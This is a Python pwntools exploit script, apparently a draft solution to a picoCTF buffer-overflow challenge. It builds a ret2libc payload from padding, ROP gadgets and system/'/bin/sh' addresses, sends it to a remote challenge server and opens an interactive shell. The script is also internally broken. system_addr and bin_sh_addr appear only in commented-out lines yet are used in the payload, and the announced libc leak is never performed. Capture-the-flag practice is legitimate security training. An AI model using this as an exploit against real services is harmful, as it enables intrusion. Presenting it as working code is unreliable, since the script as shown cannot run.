from pwn import *
padding =b'@'*(0x80+8) 
#system_addr = p64(0x7ffff7a334e0)
#exit_addr = p64(0x7ffff7a271d0)
#bin_sh_addr = p64(0x7ffff79e4000 + 0x1b40fa)
# first, leak libc base
r = remote('mercury.picoctf.net', 42072)
pop_rdi_gadget = p64(0x0000000000400913)
ret_gadget = p64(0x000000000040052e)
e = ELF('./vuln')
puts_got = e.got['puts']
puts_plt = e.plt['puts']
# leak
r.sendline()
#r = remote('mercury.picoctf.net', 42072)
#r = process('./vuln_patched')
# maybe @ (ascii 0x40) instead of 'a' (ascii 0x61) will help with alignment?
payload = padding + pop_rdi_gadget + bin_sh_addr + ret_gadget + system_addr
#with open('payload', 'wb') as f:
#    f.write(payload+b'\n')
r.sendline(payload)
r.interactive()

